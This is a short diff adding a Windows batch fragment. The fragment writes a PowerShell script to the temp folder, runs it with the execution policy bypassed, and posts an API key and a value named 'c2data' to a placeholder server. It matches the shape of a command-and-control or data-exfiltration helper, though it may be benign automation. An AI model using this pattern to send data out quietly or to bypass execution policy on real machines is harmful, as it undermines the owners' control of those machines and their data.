@@ -1,0 +1,24 @@
+REM Language : PowerShell and Command Line
+REM ---------------------------------------------------------------------------------------
+REM SEND POST DATA TO SERVER
+REM ---------------------------------------------------------------------------------------
+set sendPS=%TMP%\STS.ps1
+echo $apikey=$args[0]>%sendPS%
+echo $c=$args[1]>>%sendPS%
+echo $z=$args[2]>>%sendPS%
+echo $c2data=$args[3]>>%sendPS%
+echo $URL="https://yoursite.com/api.php">>%sendPS%
+echo $Body = @{>>%sendPS%
+echo    "data_a" = $apikey;>>%sendPS%
+echo    "data_b" = $c2data;>>%sendPS%
+echo    "data_c" = $c;>>%sendPS%
+echo    "data_d" = $z>>%sendPS%
+echo	}>>%sendPS%
+echo $response = Invoke-RestMethod -Uri $URL -Body $Body -Method POST>>%sendPS%
+echo echo $response>>%sendPS%
+REM ----------------------------------------------------------------------------------------
+
+
+set powerPolicy=-ExecutionPolicy Bypass
+for /f "delims=" %%a in ('PowerShell.exe %powerPolicy% -File %TMP%\STS.ps1 %arg0% %arg1% %arg2% %arg3%') do SET output=%%a
+
